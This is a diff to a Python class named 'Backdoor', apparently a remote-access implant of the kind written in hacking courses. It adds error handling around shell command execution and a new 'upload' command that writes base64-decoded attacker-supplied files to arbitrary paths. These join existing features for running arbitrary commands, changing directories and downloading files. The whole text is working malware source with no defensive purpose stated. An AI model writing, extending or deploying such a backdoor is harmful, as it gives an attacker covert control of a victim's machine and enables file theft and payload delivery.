@@ -33,7 +33,10 @@ class Backdoor:
                 continue
 
     def execute_system_command(self, command):
-        return subprocess.check_output(command, shell=True)
+        try:
+            return subprocess.check_output(command, shell=True)
+        except subprocess.CalledProcessError:
+            return "Error: command execution"
 
     def change_working_directory_to(self, path):
         os.chdir(path)
@@ -42,6 +45,11 @@ class Backdoor:
     def read_file(self, path):
         with open(path, "rb") as file:
             return base64.b64encode(file.read())
+
+    def write_file(self, path, content):
+        with open(path, "wb") as file:
+            file.write(base64.b64decode(content))
+            return "[+] Upload successful."
 
     def run(self):
         while True:
@@ -54,6 +62,8 @@ class Backdoor:
                 command_result = self.change_working_directory_to(received_command[1])
             elif received_command[0] == "download":
                 command_result = self.read_file(received_command[1])
+            elif received_command[0] == "upload":
+                command_result = self.write_file(received_command[1], received_command[2])
             else:
                 command_result = self.execute_system_command(received_command)
 
